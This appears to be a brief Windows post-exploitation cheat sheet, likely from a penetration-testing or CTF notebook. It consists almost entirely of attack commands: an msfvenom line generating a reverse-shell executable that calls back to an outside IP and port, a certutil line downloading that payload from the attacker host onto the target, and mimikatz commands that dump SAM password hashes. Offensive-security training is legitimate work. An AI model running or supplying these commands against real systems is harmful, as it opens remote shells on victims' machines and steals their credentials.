# Windows Cheat Sheet

- [Windows Cheat Sheet](#windows-cheat-sheet)
  - [Generate a revshell](#generate-a-revshell)
  - [Upload a file](#upload-a-file)
  - [MIMIKATZ](#mimikatz)
    - [Commands](#commands)

## Generate a revshell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.66.218 LPORT=4444 -f exe > evil.exe
```

## Upload a file
```bash
certutil.exe -urlcache -split -f http://10.11.66.218:9999/evil.exe C:\\Temp\\evil.exe
```

## MIMIKATZ
Upload `mimikatz`

### Commands
```
privilege::debug
lsadump::sam
```